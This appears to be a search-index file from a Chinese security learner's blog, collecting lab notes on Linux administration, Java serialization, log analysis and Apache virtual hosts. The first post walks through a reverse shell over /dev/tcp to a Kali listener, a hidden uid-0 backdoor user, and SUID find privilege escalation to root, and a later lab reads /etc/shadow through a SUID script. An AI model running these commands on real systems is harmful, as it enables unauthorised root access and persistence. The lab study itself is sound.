@@ -1,0 +1,2350 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>linux实操2</title>
+    <url>/2025/08/09/Linux%E5%AE%9E%E6%93%8D2/</url>
+    <content><![CDATA[1、反弹shell维权①在kali上开启端口监听
+nc -lvnp 9999
+
+
+②在centos上反弹bash，kali端成功拿到shell
+bash -i &gt;&amp; /dev/tcp/192.168.18.132/9999 0&gt;&amp;1
+
+
+③kali端利用反弹的shell创建uid为0的用户
+useradd -o -u 0 -m hack#-o表示允许创建重复uid#-u表示设置用户uid#-m表示创建家目录
+
+④kali端非交互式为刚才创建的hack用户设置密码，这里利用root权限直接修改passwd文件
+echo &quot;hack:hack123&quot; | chpasswd#将echo输出的字段作为chpasswd的输入
+
+这样我们就完成了非交互式密码更改
+⑤我们在centos上去验证一下
+重启客户机，使用刚才创建的密码去登录
+
+
+成功登录，并且作为root用户！！！！
+2、echo写入计划任务①使用反弹shell设置计划任务，一条命令执行，我们使用crontab来写入
+echo &quot;* * * 8 5 tar -zcf /var/log/secure_$(date +%F-%H%M).back /var/log/secure&quot; | crontab#* * * 8 5 计划任务时间，表示八月的每周五的每一小时，每一分钟#tar -zcf /var/log/secure_$(date +%F-%H%M).back /var/log/secure表示将/var/log/secure 打包为secure_$(date +%F-%H%M).back文件#crontab 表示使用crontab创建计划任务
+
+
+②我们去centos端验证一下
+crontab -l#命令表示查看此用户下的计划任务
+
+
+成功创建！！！！！
+3、suid提权①这个实验我们在centos端做，首先切换到一个普通用户，若没有普通用户则创建一下，这里我已经创建好了一个test用户
+su test
+
+
+②在普通用户视角下，去搜索具有SUID权限的文件，一般具有威胁的文件有find、vim、bash
+find / -perm -4000 -type f -user root 2&gt;/dev/null#/表示在根目录递归查找#-perm -4000表示精确匹配suid权限文件#-user root表示匹配root为属主的文件，这样方便提权#2&gt;/dev/null表示丢弃错误信息
+
+
+我们找到了一个find文件，利用这个文件可以提权
+③进行提权
+find . -exec /bin/bash -p \;#.表示在当前目录下依次查找文件，其实这个.和提权没多大关系#-exec /bin/bash表示追加一条命令，打开一个bash#-p表示为打开的bash保留suid权限，提权 #\;表示追加的命令结束
+
+
+④进行验证此bash权限
+whoami
+
+
+成功提权到root用户！！！！！
+4、死循环脚本，使用ps aux找到pid，利用kill命令关闭进程#!/bin/bashwhile((2&gt;1))doecho&quot;ddd&quot;done
+
+#创建一个脚本文件vim loop.sh#!/bin/bashwhile((2&gt;1))doecho&quot;ddd&quot;done#给文件添加执行权限chmod +x loop.sh
+
+
+
+①运行脚本
+./loop.sh
+
+②新开一个终端，动态查看进程
+#动态查看进程top
+
+
+可以看到第一个cpu占了31.2%，并且是执行的脚本文件
+③杀死进程
+kill -9 2783
+
+
+成功杀死进程！！！！！
+5、转义符号# 转义 $ 避免变量替换echo &quot;原样输出: \$USER&quot;    # 输出: 原样输出: $USER（而非变量值）# 转义空格处理带空格的路径touch my\ file.txt         # 创建文件 &quot;my file.txt&quot;（而非两个文件）ls my\ file.txt            # 列出文件# 转义 * 防止通配符扩展echo &quot;星号: \*&quot;            # 输出: 星号: *（而非文件列表）# 双引号内转义特殊字符echo &quot;She said: \&quot;Hello\&quot;&quot;   # 输出: She said: &quot;Hello&quot;# 单引号内转义单引号（特殊技巧）echo &#x27;It&#x27;\&#x27;&#x27;s sunny&#x27;         # 输出: It&#x27;s sunny（分段拼接）# 换行符 \necho -e &quot;第一行\n第二行&quot;# 输出:#   第一行#   第二行# 制表符 \techo -e &quot;Name:\tAlice&quot;# 输出: Name:   Alice# 长命令拆分成多行find /home -name &quot;*.log&quot; \     -type f \     -size +1M# 等价于单行命令：find /home -name &quot;*.log&quot; -type f -size +1M# 转义 . 匹配点号本身grep &quot;127\.0\.0\.1&quot; /etc/hosts  # 匹配 IP 地址（而非任意字符）
+
+]]></content>
+  </entry>
+  <entry>
+    <title>java序列化和反序列化</title>
+    <url>/2025/08/26/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[一、核心概念1. 序列化 (Serialization)
+定义： 将 Java 对象的状态信息转换为一种字节序列的过程。
+目的： 这个字节序列可以被轻松地存储到文件（.ser 文件）、写入数据库，或者通过网络传输到另一个系统。
+比喻： 就像把一辆汽车拆解成一大堆标准化的零件，然后整齐地打包进箱子，以便于运输或存放在仓库里。这个过程只打包了汽车的属性（颜色、型号、零件）和设计图信息（类结构），但并不打包制造汽车的“工厂”本身（即类的代码逻辑）。
+
+2. 反序列化 (Deserialization)
+定义： 是序列化的逆过程。将字节序列重建为内存中的 Java 对象。
+目的： 从文件、数据库或网络流中恢复出与序列化时状态完全一致的对象。
+比喻： 就像在目的地收到那箱零件后，根据里面的设计图信息，将零件重新组装回一辆一模一样的汽车。
+
+实例化类调用函数编写代码
+Test类
+public class Test &#123;    public static void main(String[] args) &#123;        Cxk kun = new Cxk();        kun.talk();    &#125;&#125;
+
+Cxk类
+public class Cxk extends Person &#123;    public String name;&#125;
+
+Person类
+public class Person &#123;    public int age;    public String tall;    public void talk()&#123;        System.out.println(&quot;i am person！！！&quot;);    &#125;&#125;
+
+执行
+
+重写talk函数，再次调用在Cxk中重写方法
+public class Cxk extends Person &#123;    public String name;    public void talk()&#123;        System.out.println(&quot;i am kun！！！&quot;);    &#125;&#125;
+
+执行
+
+编写序列化反序列化函数，对象序列化保存到文件里，再反序列化输出test
+import java.io.*;public class Test &#123;    public static void main(String[] args) throws IOException,            ClassNotFoundException &#123;        Person p = new Person();        p.age = 22;        p.name = &quot;thy&quot;;        serialize(p, &quot;thy.bin&quot;);        System.out.println(&quot;反序列化结果：&quot; + deserialize(&quot;thy.bin&quot;));    &#125;    public static void serialize(Object obj, String filePath) throws IOException &#123;        try (FileOutputStream fileOut = new FileOutputStream(filePath);             ObjectOutputStream objectOut = new ObjectOutputStream(fileOut)) &#123;            objectOut.writeObject(obj);        &#125;    &#125;    public static Object deserialize(String filePath) throws IOException,            ClassNotFoundException &#123;        try (FileInputStream fileIn = new FileInputStream(filePath);             ObjectInputStream objectIn = new ObjectInputStream(fileIn)) &#123;            return objectIn.readObject();        &#125;    &#125;&#125;
+
+person
+import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Person implements Serializable &#123;    public int age;    public String name;    private void readObject(ObjectInputStream in) throws IOException,            ClassNotFoundException &#123;        System.out.println(&quot;已反序列化&quot;);// 默认的反序列化操作        in.defaultReadObject();    &#125;&#125;
+
+执行
+
+]]></content>
+  </entry>
+  <entry>
+    <title>linux实操1</title>
+    <url>/2025/08/03/linux%E5%AE%9E%E6%93%8D1/</url>
+    <content><![CDATA[实验1：文件目录结构与基本命令操作1、在&#x2F;tmp目录下创建如下目录结构：
+/tmp/test/├── dir1/│   ├── file1.txt│   └── file2.txt├── dir2/│   └── subdir/└── file3.txt
+
+①cd &#x2F;tmp #进入tmp文件夹
+
+②mkdir -p test&#x2F;dir1 test&#x2F;dir2&#x2F;subdir #在当前目录创建一个test父级文件夹，并且创建dir1、dir2子文件夹，并在dir2中创建subdir子文件夹
+
+③cd test&#x2F;dir1 #进入新建的dir1文件夹，touch file1.txt file2.txt #创建file1、file2两个txt文件
+
+④touch file3.txt #创建file3.txt文件
+
+⑤至此目录结构创建完成
+2、将dir1目录及其内容复制到dir2&#x2F;subdir下
+①cp -r dir1 dir2&#x2F;subdir #将dir1完全复制到subdir下
+
+3、查找&#x2F;tmp目录下所有.txt文件并显示详细信息
+①find &#x2F;tmp -type f -name “*.txt” -exec ls -l {} ; #搜索&#x2F;tmp目录下所有txt文件，并执行ls -l命令，{}替换为文件路径
+
+4、将file3.txt移动到dir1目录并重命名为newfile.txt
+①mv test&#x2F;file3.txt test&#x2F;dir1&#x2F;newfile.txt #在tmp目录下，将file3.txt移动到dir1并重命名为newfile.txt，需要绝对路径
+
+实验2：用户与组管理1、创建用户user1、user2和组group1
+useradd -m user1#创建user1，创建user2同理，groupadd group1 #创建组group1
+
+
+2、将user1和user2加入group1组
+
+3、创建目录&#x2F;shared，设置权限使group1组成员可以读写，其他人无权限
+mkdir shared #创建shared目录
+
+chgrp group1 shared #将目录所属组变为group1，chmod 770 shared #将目录权限改为属组可读写，其他人无权限
+
+4、验证user1可以在&#x2F;shared中创建文件，user3(非组成员)不能访问
+
+
+实验3：权限管理(UGO)1、创建文件&#x2F;data&#x2F;secret.txt，内容为”Top Secret”
+mkdir &#x2F;data #创建data目录，vim secret.txt #创建secret文件并编写内容
+
+
+2、设置权限：所有者root可读写，组admin可读，其他人无权限
+groupadd admin #创建admin组
+
+chgrp admin secret.txt #将文件属组改为admin
+
+chmod 740 secret.txt #设置权限为root可读写，组admin可读，其他无权限
+
+3、创建用户testuser并尝试访问该文件验证权限
+useradd testuser #创建testuser
+
+su testuser #切换到testuser用户，cat secret.txt #获取文件，验证权限，无法访问，权限不够
+
+4、使用ACL添加testuser的读写权限
+setfacl -m u:testuser:rw- secret.txt #给testuser设置权限，可读写secret.txt
+
+再次切换到testuser，cat secret.txt验证是否能访问，成功访问
+
+实验4：SUID权限应用1、创建脚本&#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile，内容为显示&#x2F;etc&#x2F;shadow文件内容
+vim &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh #创建脚本文件
+
+chmod u+x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh  #给文件设置可执行权限
+
+2、设置脚本所有者为root并添加SUID权限
+chown root &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh   #设置脚本所有者为root
+
+chmod 4755 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh #设置suid权限，4表示suid，也可使用chmod u+s来设置suid权限
+
+3、使用普通用户执行该脚本验证权限提升
+su - user1  #切换到普通用户
+
+cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile  #使用命令来验证能否查看脚本内容
+
+成功查看
+4、实验完成后移除SUID权限
+chmod 755 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh  #移除suid权限
+
+要求：对脚本内容进行注释
+#showfileecho &#x27;#!/bin/bashcat /etc/shadow&#x27; &gt; /usr/local/bin/showfilechmod +x /usr/local/bin/showfile
+
+实验5：文件属性保护1、创建重要配置文件&#x2F;etc&#x2F;important.conf
+touch &#x2F;etc&#x2F;important.conf #创建文件
+
+2、使用chattr命令防止文件被修改或删除
+chattr +i &#x2F;etc&#x2F;importtant.conf #设置i属性，防止修改删除
+lsattr &#x2F;etc&#x2F;importtant.conf #查看属性
+
+3、尝试修改和删除文件验证保护效果
+rm &#x2F;etc&#x2F;importtant.conf #删除文件
+
+4、恢复文件正常属性
+chattr &#x3D;表示移除所有属性，移除后进行验证，是否能删除
+
+成功删除
+
+实验6：sudo权限配置1、创建用户admin和组sudoadmin
+useradd admin #创建用户，groupadd admin #创建组
+
+此时admin用户无法使用sudo无密码执行
+
+2、配置sudo使sudoadmin组成员可以执行所有命令无需密码
+visudo修改配置文件，添加%sudoadmin ALL&#x3D;(ALL:ALL) NOPASSWD: ALL
+
+3、将admin用户加入sudoadmin组
+usermod -aG sudoadmin admin #将用户加入组
+
+4、验证admin用户可以使用sudo执行特权命令
+
+成功执行
+实验7：综合权限管理1、创建目录&#x2F;project，属组为devteam
+先创建目录和组
+
+修改&#x2F;project属组为devteam
+
+
+2、设置权限：组成员可读写，其他人只读
+
+
+3、设置SGID权限使新建文件自动继承组权限
+chmod g+s可设置sgid权限
+
+4、创建用户dev1、dev2并加入devteam组
+
+5、验证dev1创建的文件dev2可以编辑
+切换到dev1用户，在project目录下创建一个1.txt文件
+
+
+切换到dev2用户，尝试修改1.txt文件
+
+成功执行
+实验8：日志分析与安全审计：1、创建日志文件 将以下内容保存为 /var/log/application.log：
+2024-03-15 09:10:22 [INFO] User &#x27;admin&#x27; authenticated from 192.168.1.100 (session: SESS-7X2G9P)2024-03-15 09:11:05 [ERROR] Failed login attempt for user &#x27;root&#x27; from 10.0.0.55 (reason: invalid password)2024-03-15 09:12:33 [WARNING] High CPU usage detected (92%) on server-node-012024-03-15 09:13:17 [SECURITY] Sensitive file accessed: /etc/shadow by user &#x27;backup&#x27;2024-03-15 09:14:02 [DEBUG] API request: GET /api/v1/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...2024-03-15 09:15:48 [INFO] Payment processed: $250.00 via Credit Card (ref: PAY-8832)2024-03-15 09:16:30 [ERROR] Database connection timeout (MySQL@10.0.0.100:3306)2024-03-15 09:17:11 [ALERT] SSH brute force detected from 45.33.12.88 (15 attempts)
+
+2、设置权限
+chmod 640 /var/log/application.logchown root:adm /var/log/application.log
+
+任务1.1：统计日志中所有错误事件的数量
+任务1.2：提取所有包含IP地址的行（仅显示IP）
+任务2.1：查看SECURITY事件及其前后1行内容
+任务3.1：找出所有涉及金额的记录（含$符号）
+扩展任务：提取金额数值并计算总和
+​				   时间范围统计：统计09:10-09:15期间的事件数量
+任务4.1：检测潜在暴力破解行为
+grep &quot;Failed login\|brute force&quot; /var/log/application.log
+
+编写自动化脚本，analyzer.sh，并使用chmod +x赋予执行权限
+#!/bin/bash# 多功能日志分析工具# 用法：./analyzer.sh [日志文件路径]LOG_FILE=&quot;$&#123;1:-/var/log/syslog&#125;&quot;  # 默认使用syslog，可指定其他文件TEMP_IP_FILE=&quot;/tmp/ips.tmp&quot;       # IP临时文件TEMP_AMOUNT_FILE=&quot;/tmp/amounts.tmp&quot; # 金额临时文件# 任务1.1: 统计错误事件数量analyze_errors() &#123;    echo &quot;===== 任务1.1: 错误事件统计 =====&quot;    local error_count=$(grep -i -E &quot;error|fail|critical|exception&quot; &quot;$LOG_FILE&quot; | wc -l)    echo &quot;总错误事件数量: $error_count&quot;        # 错误类型细分    echo -e &quot;\n错误类型分布:&quot;    grep -i -o -E &quot;error|fail|critical|exception&quot; &quot;$LOG_FILE&quot; | sort | uniq -c | sort -nr    echo&#125;# 任务1.2: 提取所有IP地址extract_ips() &#123;    echo &quot;===== 任务1.2: IP地址提取 =====&quot;    # 使用增强IP正则表达式    grep -E -o &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; &quot;$LOG_FILE&quot; | sort -u &gt; &quot;$TEMP_IP_FILE&quot;    echo &quot;找到唯一IP地址: $(wc -l &lt; &quot;$TEMP_IP_FILE&quot;)&quot;    echo -e &quot;\n前10个IP:&quot;    head -n 10 &quot;$TEMP_IP_FILE&quot;    echo&#125;# 任务2.1: 查看SECURITY事件及上下文show_security_events() &#123;    echo &quot;===== 任务2.1: SECURITY事件分析 =====&quot;    local security_count=$(grep -i &quot;SECURITY&quot; &quot;$LOG_FILE&quot; | wc -l)    echo &quot;找到SECURITY事件: $security_count&quot;        if [ &quot;$security_count&quot; -gt 0 ]; then        echo -e &quot;\nSECURITY事件及上下文 (前5个):&quot;        grep -i &quot;SECURITY&quot; -A 1 -B 1 &quot;$LOG_FILE&quot; | head -n 15    else        echo &quot;未找到SECURITY事件&quot;    fi    echo&#125;# 任务3.1: 金额记录分析analyze_amounts() &#123;    echo &quot;===== 任务3.1: 金额记录分析 =====&quot;    # 查找所有包含$符号的行    grep &quot;\$&quot; &quot;$LOG_FILE&quot; &gt; &quot;$TEMP_AMOUNT_FILE&quot;    local amount_count=$(wc -l &lt; &quot;$TEMP_AMOUNT_FILE&quot;)    echo &quot;找到包含金额的记录: $amount_count&quot;        if [ &quot;$amount_count&quot; -gt 0 ]; then        # 扩展任务: 提取金额并计算总和        echo -e &quot;\n金额记录示例 (前5个):&quot;        head -n 5 &quot;$TEMP_AMOUNT_FILE&quot;                # 提取金额数值        local total_amount=0        local amounts=()        while IFS= read -r line; do            # 匹配$后跟数字/小数点的金额            if [[ &quot;$line&quot; =~ \$([0-9]+(\.[0-9]&#123;1,2&#125;)?) ]]; then                amount=&quot;$&#123;BASH_REMATCH[1]&#125;&quot;                amounts+=(&quot;$amount&quot;)                total_amount=$(awk &quot;BEGIN &#123;printf \&quot;%.2f\&quot;, $total_amount + $amount&#125;&quot;)            fi        done &lt; &quot;$TEMP_AMOUNT_FILE&quot;                echo -e &quot;\n金额总和: \$$total_amount&quot;        echo &quot;提取金额数量: $&#123;#amounts[@]&#125;&quot;    else        echo &quot;未找到金额记录&quot;    fi    echo&#125;# 扩展任务: 时间范围统计time_range_analysis() &#123;    echo &quot;===== 扩展任务: 时间范围统计 (09:10-09:15) =====&quot;    # 根据日志格式调整时间匹配模式    local time_count=$(grep -E &quot;09:(1[0-4]|15)&quot; &quot;$LOG_FILE&quot; | wc -l)    echo &quot;09:10-09:15期间的事件数量: $time_count&quot;        # 显示该时间段的事件类型分布    echo -e &quot;\n事件类型分布:&quot;    grep -E &quot;09:(1[0-4]|15)&quot; &quot;$LOG_FILE&quot; | grep -o -E &quot;\[[A-Z]+\]|\b[A-Z]&#123;3,&#125;\b&quot; | sort | uniq -c | sort -nr | head -5    echo&#125;# 任务4.1: 检测潜在暴力破解detect_bruteforce() &#123;    echo &quot;===== 任务4.1: 潜在暴力破解检测 =====&quot;    # 检测失败的登录尝试    echo &quot;检测失败的登录尝试...&quot;    local failed_logins=$(grep -i &quot;fail&quot; &quot;$LOG_FILE&quot; | grep -E &quot;login|auth|ssh&quot;)        if [ -n &quot;$failed_logins&quot; ]; then        # 提取IP和尝试次数        echo &quot;$failed_logins&quot; | grep -E -o &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | sort | uniq -c | sort -nr &gt; &quot;$TEMP_IP_FILE&quot;                local suspicious_count=0        echo -e &quot;\n登录失败统计:&quot;        while IFS= read -r line; do            attempts=$(echo &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;)            ip=$(echo &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;)                        if [ &quot;$attempts&quot; -gt 5 ]; then                echo &quot;[!] 可疑: IP $ip 有 $attempts 次失败尝试&quot;                ((suspicious_count++))            else                echo &quot;[ ] 正常: IP $ip 有 $attempts 次失败尝试&quot;            fi        done &lt; &quot;$TEMP_IP_FILE&quot;                echo -e &quot;\n检测到 $suspicious_count 个可疑IP&quot;    else        echo &quot;未找到失败登录记录&quot;    fi    echo&#125;# 主函数main() &#123;    # 检查日志文件是否存在    if [ ! -f &quot;$LOG_FILE&quot; ]; then        echo &quot;错误: 日志文件不存在 - $LOG_FILE&quot;        exit 1    fi        echo &quot;===== 开始分析日志: $LOG_FILE =====&quot;    echo &quot;文件大小: $(du -h &quot;$LOG_FILE&quot; | cut -f1)&quot;    echo &quot;最后修改: $(stat -c %y &quot;$LOG_FILE&quot;)&quot;    echo &quot;总行数: $(wc -l &lt; &quot;$LOG_FILE&quot;)&quot;    echo        # 执行所有分析任务    analyze_errors    extract_ips    show_security_events    analyze_amounts    time_range_analysis    detect_bruteforce        # 清理临时文件    rm -f &quot;$TEMP_IP_FILE&quot; &quot;$TEMP_AMOUNT_FILE&quot;        echo &quot;===== 分析完成 =====&quot;&#125;# 执行主函数main
+
+执行后如图
+
+任务5.1：分析脚本文件生成安全事件报告
+echo &quot;安全事件报告&quot; &gt; report.txt		#输出安全事件报告标题到report中date &gt;&gt; report.txt                  #输出日期到报告中echo &quot;=== 高风险事件 ===&quot; &gt;&gt; report.txt    #输出高风险事件标题grep -E &quot;SECURITY|ALERT&quot; /var/log/application.log &gt;&gt; report.txt   #匹配SECURITY和ALERT事件，并输出到报告中echo &quot;=== 异常IP列表 ===&quot; &gt;&gt; report.txt #输出异常IP到报告中 grep -Eo &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; /var/log/application.log | sort -u &gt;&gt; report.txt    #匹配IP，并输出到报告中
+
+
+]]></content>
+  </entry>
+  <entry>
+    <title>linux搭建apache服务器</title>
+    <url>/2025/08/04/linux%E6%90%AD%E5%BB%BAapache%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
+    <content><![CDATA[一、搭建环境操作系统：CentOS 8
+服务器：apache
+镜像源：https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo
+二、搭建步骤1.下载镜像wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.huaweicloud.com/repository/conf/CentOS-8-reg.repo
+
+2.下载apache服务#下载apacheyum install httpd#安装完成后，开启apache服务systemctl start httpd#检查状态，出现如下页面证明成功开启systemctl status httpd
+
+
+3.apache配置文件介绍#在下载apache时，会自动生成apache配置文件#检查配置文件#apache主配置文件，路径为/etc/httpd/conf/httpd.conf#apache虚拟主机配置文件，路径为/etc/httpd/conf.d#apache自定义配置文件，存放在虚拟主机配置文件目录下，如：/etc/httpd/conf.d/mywebsite.conf#可以检查系统新增系统服务，验证apache服务systemctl list-unit-files | grep http[root@localhost /]# systemctl list-unit-files | grep httphttpd.service                              disabled httpd@.service                             disabled httpd.socket                               disabled #检查新增的apache进程ps aux | grep httpd[root@localhost /]# ps aux | grep httpdroot      32866  0.0  1.3 273860 10700 ?        Ss   15:42   0:00 /usr/sbin/httpd -DFOREGROUNDapache    32870  0.0  1.0 286076  8244 ?        S    15:42   0:00 /usr/sbin/httpd -DFOREGROUNDapache    32872  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUNDapache    32873  0.0  1.6 1933752 13600 ?       Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUNDapache    32876  0.0  1.1 1802624 9512 ?        Sl   15:42   0:00 /usr/sbin/httpd -DFOREGROUNDroot      33313  0.0  0.1  12320   992 pts/0    S+   15:56   0:00 grep --color=auto httpd#检查新增日志文件ls -l /var/log/httpd[root@localhost /]# ls -l /var/log/httpd总用量 4-rw-r--r--. 1 root root    0 8月   4 15:42 access_log-rw-r--r--. 1 root root 1036 8月   4 15:42 error_log#检查新增用户和组grep apache /etc/passwdgrep apache /etc/group[root@localhost /]# grep apache /etc/groupapache:x:48:[root@localhost /]# grep apache /etc/passwdapache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+4.搭建静态页面以上我们已经搭建好apache服务，现在需要利用apache服务来搭建一个自己的网站
+#首先，需要将静态页面保存到apache的网站根目录/var/www/html下，名为index.html#以下是我自己的静态页面代码&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;测试页面&lt;/title&gt;    &lt;style&gt;        body &#123;            font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);            display: flex;            justify-content: center;            align-items: center;            height: 100vh;            margin: 0;            padding: 20px;        &#125;        h1 &#123;            color: #333;            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);            font-size: 3rem;            animation: fadeIn 1.5s ease-in-out;        &#125;        @keyframes fadeIn &#123;            from &#123;                opacity: 0;                transform: translateY(-20px);            &#125;            to &#123;                opacity: 1;                transform: translateY(0);            &#125;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;欢迎来到HacerkT的世界&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+
+保存好之后，访问一下静态页面
+#查看一下自己的ip地址ifconfig#然后用浏览器直接访问ip地址，成功访问之后证明网站搭建完毕
+
+
+到此，网站已经搭建完毕！
+5.搭建第二网站搭建第二网站需要运用到apache的一个核心功能，虚拟主机，他允许单台服务器通过不同ip、域名、端口托管多个不同网站
+三种方式基于域名：不同域名访问不同网站，如a.com和b.com基于ip：不同ip访问不同网站，如http://10.1.1.1和http://10.1.1.2基于端口：不同端口访问不同网站，如http://10.1.1.1:81和http://10.1.1.1:82
+
+这里我们使用域名来搭建第二网站
+#创建新的网站目录和日志目录，在/var/www下创建，例如/var/www/study/html和/var/www/study/logmkdir -p /var/www/study/html /var/www/study/log#新建日志文件，错误日志study_error.log和访问日志study_access.logtouch /var/www/study/log/study_error.log /var/www/study/log/study_access.log#修改配置文件，路径为/etc/httpd/conf.d目录下，创建一个新的配置文件，例如study.confvim /etc/httpd/conf.d/study.conf&lt;VirtualHost *:80&gt;ServerName study.com # 主域名ServerAlias study1.com # 备用域名DocumentRoot /var/www/study/html # 网站根目录ErrorLog /var/www/study/log/study_error.log # 错误日志CustomLog /var/www/study/log/study_access.log combined # 访问日志&lt;/VirtualHost&gt;#需要注意，在配置文件的时候，不能加上#的内容，例如#主域名，这个要删除
+
+做完这些之后，写第二网站的静态页面，同之前一样，但这里注意网站的路径为&#x2F;var&#x2F;www&#x2F;study&#x2F;html，所以html文件保存在这个路径下，以下是我第二个网页的代码
+这里需要注意一下，需要配置属主属组为apache，并配置权限
+chown apache:apache /var/www/study/html/index.htmlchmod 755 /var/www/study/html/index.html
+
+
+
+&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;网络安全学习路线基础篇&lt;/title&gt;    &lt;style&gt;        :root &#123;            --primary-color: #2c3e50;            --secondary-color: #3498db;            --background-color: #f9f9f9;            --card-bg: #ffffff;            --text-color: #333333;        &#125;        body &#123;            font-family: &#x27;Segoe UI&#x27;, Tahoma, Geneva, Verdana, sans-serif;            background-color: var(--background-color);            color: var(--text-color);            margin: 0;            padding: 20px;            line-height: 1.6;        &#125;        .container &#123;            max-width: 1200px;            margin: 0 auto;            padding: 20px;        &#125;        h1 &#123;            color: var(--primary-color);            text-align: center;            margin-bottom: 40px;            font-size: 2.5rem;            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);        &#125;        .module &#123;            background-color: var(--card-bg);            border-radius: 10px;            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);            padding: 25px;            margin-bottom: 30px;            transition: transform 0.3s ease;        &#125;        .module:hover &#123;            transform: translateY(-5px);        &#125;        .module h2 &#123;            color: var(--secondary-color);            border-bottom: 2px solid var(--secondary-color);            padding-bottom: 10px;            margin-bottom: 20px;        &#125;        ul &#123;            list-style-type: none;            padding: 0;        &#125;        li &#123;            padding: 8px 0;            border-bottom: 1px solid #eee;        &#125;        li:last-child &#123;            border-bottom: none;        &#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;div class=&quot;container&quot;&gt;        &lt;h1&gt;网络安全学习路线基础篇&lt;/h1&gt;        &lt;div class=&quot;module&quot;&gt;            &lt;h2&gt;1. 操作系统基础&lt;/h2&gt;            &lt;ul&gt;                &lt;li&gt;Windows&lt;/li&gt;                &lt;li&gt;Linux&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class=&quot;module&quot;&gt;            &lt;h2&gt;2. 计算机网络基础&lt;/h2&gt;            &lt;ul&gt;                &lt;li&gt;网络设备&lt;/li&gt;                &lt;li&gt;协议&lt;/li&gt;                &lt;li&gt;数据包&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class=&quot;module&quot;&gt;            &lt;h2&gt;3. 数据库基础&lt;/h2&gt;            &lt;ul&gt;                &lt;li&gt;MySQL&lt;/li&gt;                &lt;li&gt;MSSQL&lt;/li&gt;                &lt;li&gt;Redis&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;        &lt;div class=&quot;module&quot;&gt;            &lt;h2&gt;4. 代码基础&lt;/h2&gt;            &lt;ul&gt;                &lt;li&gt;PHP&lt;/li&gt;                &lt;li&gt;JS&lt;/li&gt;                &lt;li&gt;Python&lt;/li&gt;                &lt;li&gt;Java&lt;/li&gt;            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+
+这里出现几个问题，当我们使用域名study.com访问的时候，访问的是其他的网站
+这里做了域名解析
+
+可以看到是其他ip，原因可能是因为在浏览器解析域名的时候是公网的DNS服务器，所以无法定位到你的虚拟机，但是可以通过命令行进行访问
+curl -H &quot;Host: study.com&quot; http://192.168.xx.xx/
+
+
+成功访问！证明我们的配置没有问题
+还有一个问题是，在浏览器上使用ip进行访问的时候，访问的是第二网页，那么我们之前通过ip访问的第一网页去哪了呢？？？？？
+
+原因是因为你在apache上开启了虚拟主机这个配置，并且配置了域名，让你的ip有了一个指向，目标就是你的域名，所以它会自动将域名和ip绑定，访问的路径自然就是你第二网页的路径&#x2F;var&#x2F;www&#x2F;study&#x2F;heml而不是默认网页&#x2F;var&#x2F;www&#x2F;html，所以就造成了当浏览器输入IP进行访问的时候，访问的是你的第二网页。
+那有什么办法能访问到两个网页呢？？？？
+当然有，这需要做一个配置，新建一个虚拟配置文件，让这个配置文件指向你的默认页面
+新建一个index.conf的配置文件，在/etc/httpd/conf.d/目录下vim /etc/httpd/conf.d/index.conf保存一下内容&lt;VirtualHost *:80&gt;    # 使用通配符&quot;_&quot;表示默认主机    ServerName _    # 明确指向Apache的默认目录    DocumentRoot /var/www/html    &lt;Directory &quot;/var/www/html&quot;&gt;        Options -Indexes +FollowSymLinks        AllowOverride All        Require all granted    &lt;/Directory&gt;&lt;/VirtualHost&gt;
+
+配置好后，编辑你的物理机的”C:\Windows\System32\drivers\etc\hosts”配置文件
+在末尾加上192.168.x.x  study.com www.study.com192.168.x.x是你虚拟机服务器的ip地址
+
+配置完成之后，去浏览器清理dns缓存，直接ctrl+shift+delete
+然后在命令行里输入，ipconfig &#x2F;flushdns，刷新dns解析缓存
+然后再次尝试在浏览器通过域名和ip进行访问
+
+
